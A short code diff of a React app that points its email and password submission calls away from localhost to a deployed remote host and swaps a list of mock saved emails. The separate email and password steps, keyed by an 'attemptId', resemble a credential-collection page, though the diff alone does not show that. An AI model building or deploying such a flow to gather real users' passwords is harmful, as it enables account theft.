@@ -19,7 +19,7 @@ export default function App() {
   const [savedEmails, setSavedEmails] = useState<string[]>([]);
 
   useEffect(() => {
-    const mockEmails = ['user@example.com', 'avotv2020@gmail.com', 'test@outlook.com'];
+    const mockEmails = ['abcd@outlook.cm', 'work@gmail.com'];
     setSavedEmails(mockEmails);
   }, []);
 
@@ -32,7 +32,7 @@ export default function App() {
     setError('');
 
     try {
-      const response = await fetch('http://localhost:3000/api/submit-email', {
+      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-email', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email }),
@@ -63,7 +63,7 @@ export default function App() {
     setError('');
 
     try {
-      const response = await fetch('http://localhost:3000/api/submit-password', {
+      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-password', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ attemptId, password }),
